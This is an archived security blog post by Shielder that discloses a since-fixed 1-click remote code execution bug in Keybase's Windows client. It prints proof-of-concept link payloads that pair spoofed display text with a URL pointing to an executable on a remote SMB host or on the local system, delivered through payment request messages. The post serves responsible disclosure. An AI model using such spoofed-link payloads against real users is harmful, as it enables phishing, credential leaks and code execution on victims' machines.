---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-04-27_1-click-rce-on-keybase.md
original_filename: 2020-04-27_1-click-rce-on-keybase.md
title: 1-click RCE on Keybase
category: documents
detected_topics:
- command-injection
- supply-chain
tags:
- imported
- documents
- command-injection
- supply-chain
language: en
raw_sha256: 1cff6898c9b8d27b3745f97e1e358893da3e70e101ba9acc6993698dbab621b5
text_sha256: 9dab44a66d39948c209b3f0b9d3d42065014ed8114459f97489bbf0b274ff911
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# 1-click RCE on Keybase

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-04-27_1-click-rce-on-keybase.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `1cff6898c9b8d27b3745f97e1e358893da3e70e101ba9acc6993698dbab621b5`
- Text SHA256: `9dab44a66d39948c209b3f0b9d3d42065014ed8114459f97489bbf0b274ff911`


## Content

---
title: "1-click RCE on Keybase"
page_title: "Shielder - 1-click RCE on Keybase"
url: "https://www.shielder.it/blog/1-click-rce-on-keybase/"
final_url: "https://www.shielder.com/blog/2020/04/1-click-rce-on-keybase/"
authors: ["smaury (@smaury92)"]
programs: ["Keybase"]
bugs: ["RCE"]
publication_date: "2020-04-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4630
---

[![shielder logo homepage](https://www.shielder.com/img/logoshielder.svg)](https://www.shielder.com/ "homepage") __

  * [Home](https://www.shielder.com/ "Home")
  * [Company](https://www.shielder.com/company "Company")
  * [Services](https://www.shielder.com/services "Services")
  * [Advisories](https://www.shielder.com/advisories "Advisories")
  * [Blog](https://www.shielder.com/blog "Blog")
  * [Careers](https://www.shielder.com/careers "Careers")
  * [Contacts](https://www.shielder.com/contacts "Contacts")
  * ENG

[ENG](https://www.shielder.com/blog/2020/04/1-click-rce-on-keybase/ "ENG") [ITA](https://www.shielder.com/it/blog/2020/04/1-click-rce-on-keybase/ "ITA")

# 1-click RCE on Keybase

### TL;DR

[Keybase clients](https://keybase.io/download) allowed to send links in chats with arbitrary schemes and arbitrary display text. On Windows it was possible to send an apparently harmless link which, when clicked, could execute arbitrary commands on the victim’s system.

## Introduction

[Keybase](https://keybase.io/) is a chat, file sharing, git, * platform, similar to [Slack](https://slack.com/), but with a security in-depth approach. *Everything* on Keybase is encrypted, allowing you to relax while syncing your private files on the cloud.

Due to its security features and the pretty good results in the [assault by the NCC Group’s army against its protocol](https://keybase.io/docs-assets/blog/NCC_Group_Keybase_KB2018_Public_Report_2019-02-27_v1.3.pdf) I became an active Keybase user.

## Fat-fingering -> Bug

While fat-fingering in one of my chats I suddenly came across a weird Keybase behavior. I was sending to [@Th3Zer0](https://twitter.com/Th3Zer0) and [@Paupu_95](https://twitter.com/Paupu_95) an e-mail address and I wanted to enclose it between two backticks, but I ended up writing:
  
  
  `
  `email@domain.tld`
  

With my big surprise the text was sent and converted to:
  
  
  `$>kb$eyJ0eXAiOjUsIm1haWx0byI6eyJkaXNwbGF5IjoiZW1haWxAZG9tYWluLnRsZCIsInVybCI6Im1haWx0bzplbWFpbEBkb21haW4udGxkIiwicHVueWNvZGUiOiIifX0=$&lt;kb$
  

People used to play with base64 encoded data may have already noticed the “ _ey_ ” beginning of the string, which means we have a base64 encoded JSON string: `{"typ":5,"mailto":{"display":"email@domain.tld","url":"mailto:email@domain.tld","punycode":""}}`.

Obviously neither me, nor my colleagues could ignore such behavior and in a matter of second our chat was full of backticks and various kind of URIs, which led us to discover that also `http` URIs were bugged in the same way.

## What if?

What if we can create a link with the following format?

`{"typ":4,"link":{"display":"http://www.shielder.com","url":"http://evil.it","punycode":""}}`

With this idea in mind we tried multiple approaches, but everything failed:

  * sending a `$>kb$<base64_string>$<kb$` via the keybase GUI client
  * sending a `$>kb$<base64_string>$<kb$` via the keybase CLI client
  * sending a `$>kb$<base64_string>$<kb$` via the keybase mobile client

At this point we were pretty close to give up and we thought that the bug could not be exploited.

## Fat-fingering v2.0 –> Self-ownage

One of the very last attempts ended up with me `CTRL+V`ing the payload too many times, resulting in the Keybase client showing the draft preview and telling me “ _This message failed to send, message is too long. Cancel or Edit_ ”.

Wait what?!?!?! The `$>kb$eyJ0eXAiOjQsImxpbmsiOnsiZGlzcGxheSI6Imh0dHA6Ly9zaGllbGRlci5pdCIsInVybCI6Imh0dHA6Ly9ldmlsLml0IiwicHVueWNvZGUiOiIifX0=$<kb$` string was converted to a link displaying `http://www.shielder.com`, but opening `http://evil.it` once clicked. 🙌🏾

After a bunch of seconds of _euphoria_ I realized the uncomfortable truth.

![](/img/blog/self-ownage.jpeg)

The _coup de grace_ was that I also realized I could achieve `Command Execution` by setting as `url` a path to a local executable or a path to a file hosted on a `SMB` server while targeting a [Windows](https://www.microsoft.com/en-us/windows) client.

![{“typ”:4,“link”:{“display”:“http://www.shielder.com”,“url”:"\\\\1.3.3.7\\tmp\\a.exe",“punycode”:""}}](/img/blog/Net-NTLM-hashes-leak-Keybase.png)

{“typ”:4,“link”:{“display”:“http://www.shielder.com”,“url”:"\\\1.3.3.7\tmp\a.exe",“punycode”:""}}

## 0.1337 XLM for RCE

With the working payload in my hands I started thinking about all the Keybase features in order to find a place where a user-controllable input might have been “ _transformed_ ” before being displayed to a third-party.

That’s where [Lumens](https://keybase.io/blog/keybase-stellar-launch) (XLM) joined the party! Lumens are a crypto-currency developed by [Stellar](http://stellar.org/) and fully-integrated in the Keybase client. You can easily send / receive XLM and also send payment requests in chats.

Payment requests obviously allow to set a custom message and, _guess what_ , the message body is evaluated by the client converting our beloved `$>kb$<base64_string>$<kb$` strings to link objects. 🤟🏾

![{“typ”:4,“link”:{“display”:“http://www.shielder.com”,“url”:“C:\\windows\\system32\\calc.exe”,“punycode”:""}}](/img/blog/Keybase-RCE.png)

{“typ”:4,“link”:{“display”:“http://www.shielder.com”,“url”:“C:\windows\system32\calc.exe”,“punycode”:""}}

## Your money or your shell 🔫

Finally I managed to have a working 1-click exploit, by just sending a payment request to anyone on Keybase with a phishy link as request message I could execute arbitrary command on their system once they click the link!

![](/img/blog/1-click-rce-keybase.jpeg)

## 💰 ¡Bounty! 💰

The Keybase team does its best to make a secure product and, like other companies, they have a [bug bounty program](https://hackerone.com/keybase).

Right after the creation of the final PoC I reported the vulnerability to the team and in less than 15 minutes they replied.

![](/img/blog/bounty-decision-keybase.png)

~~Bounty~~ `¯\_(ツ)_/¯` .

Looks like someone reported the URL spoofing before me, but she didn’t thought it can be leveraged to RCE.

I then asked [@maxtaco](https://twitter.com/maxtaco) and [@cjb](https://twitter.com/cjbprime) to share with me the beta version to verify that their [fix](https://github.com/keybase/client/pull/22045) for the URL spoofing was enough to prevent the RCE too and it was the case as now:

  * the “display” field is gone
  * the “url” field is prefixed with “http://” when it doesn’t begin with “http(s)://”

Even though this journey didn’t end up with a bounty it was really nice and I enjoyed working with the Keybase team on this issue, they were professional and super fast in fixing / replying on the [Hackerone](https://www.hackerone.com/) report!

__ 5 min

Date

27 April 2020

 __[Keybase](/tags/keybase "Keybase") [Bug Bounty](/tags/bug-bounty "Bug Bounty") [RCE](/tags/rce "RCE") [Exploit](/tags/exploit "Exploit")

Author

[smaury](/authors/smaury "smaury")

[ __](https://twitter.com/smaury92 "smaury Twitter profile")[__](https://github.com/smaury "smaury GitHub profile")[__](https://linkedin.com/in/smaury "smaury LinkedIn profile")

I’m Abdel Adim Oisfi aka smaury.  
Job: CEO, Security Researcher, Penetration Tester at Shielder.  
Passions: Hacking, hitchhiking, cliff jumping and skinned knees.

Previous post

[NotSoSmartConfig: broadcasting WiFi credentials Over-The-Air](https://www.shielder.com/blog/2020/04/notsosmartconfig-broadcasting-wifi-credentials-over-the-air/ "NotSoSmartConfig: broadcasting WiFi credentials Over-The-Air")

Next post

[Sometimes they come back: exfiltration through MySQL and CVE-2020-11579](https://www.shielder.com/blog/2020/07/sometimes-they-come-back-exfiltration-through-mysql-and-cve-2020-11579/ "Sometimes they come back: exfiltration through MySQL and CVE-2020-11579")

Info

Shielder S.p.A.

P.I. 11435310013

REA TO - 1213132

Registered Capital: 81.000,00 €

[Via Palestro, 1/C  
10064 Pinerolo (TO) Italy](https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575 "corporate headquarters")

![ISO27001](/img/iso27001.png)

![ISO9001](/img/iso9001.png)

Contacts

[info@shielder.com](mailto:info@shielder.com "email Shielder")

Landline: [(+39) 0121 - 39 36 42](tel:+390121393642 "Landline")

Commercial: [(+39) 345 - 57 18 634](tel:+393455718634 "Commercial")

Technical: [(+39) 393 - 16 66 814](tel:+393931666814 "Technical")

[ __](https://twitter.com/ShielderSec "Shielder Twitter profile")[__](https://bsky.app/profile/shielder.com "Shielder Bluesky profile")[__](https://infosec.exchange/@Shielder "Shielder Mastodon profile")[__](https://www.linkedin.com/company/shielder "Shielder LinkedIn profile")[__](https://github.com/shieldersec "Shielder Github profile")

Sitemap

[Home](https://www.shielder.com/ "Home")

[Company](https://www.shielder.com/company "Company")

[Services](https://www.shielder.com/services "Services")

[Advisories](https://www.shielder.com/advisories "Advisories")

[Blog](https://www.shielder.com/blog "Blog")

[Careers](https://www.shielder.com/careers "Careers")

[Contacts](https://www.shielder.com/contacts "Contacts")

Copyright © Shielder 2014 - 2026 [Disclosure policy](/disclosure-policy "Disclosure Policy") [Privacy policy](/privacy-policy "Privacy Policy")
